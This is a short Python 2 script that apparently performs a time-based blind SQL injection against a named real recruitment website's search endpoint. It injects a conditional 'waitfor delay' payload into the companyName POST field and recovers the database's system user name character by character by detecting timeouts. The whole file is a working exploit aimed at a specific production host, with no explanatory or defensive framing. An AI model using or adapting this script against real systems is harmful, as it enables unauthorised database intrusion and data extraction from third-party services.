#encoding=gbk
import httplib
import time
import string
import sys
import urllib

headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36'}
payloads = list(string.ascii_lowercase)
#payloads = list('abcdefghijklmnopqrstuvwxyz0123456789@_.')

for i in range(0,10):
    payloads.append(str(i))
payloads += ['@','_', '.', '-', '\\', ' ']
print 'Try to retrive user:'
user = ''
for i in range(1,11):
    for payload in payloads:
        try:
            #start_time = time.time()
            conn = httplib.HTTPConnection('xiaoyuan.zhaopin.com', timeout=5)
            s = "if(ascii(substring(system_user,%s,1))=%s)waitfor delay'0:0:8'--" %(i, ord(payload))
            postData = "CityId=551&schoolName=&companyName=test'" + s + "&StartTime=%E9%80%89%E6%8B%A9%E6%97%A5%E6%9C%9F&EndTime=%E9%80%89%E6%8B%A9%E6%97%A5%E6%9C%9F&PageSize=30&PageNumber=1&SelectPage="
            #print postData
            requrl = "/FindFullTime/Presentation/SearchResult"
            conn.request(method = "POST", url = requrl, body = postData, headers = headers)
            html_doc = conn.getresponse().read()
            conn.close()
            print payload,
            #print html_doc
        #if (time.time() - start_time) > 3:
        except Exception, e:
            user += payload
            print '\n[*]', user
            break
#print html_doc
print '\n[Done] User is:', user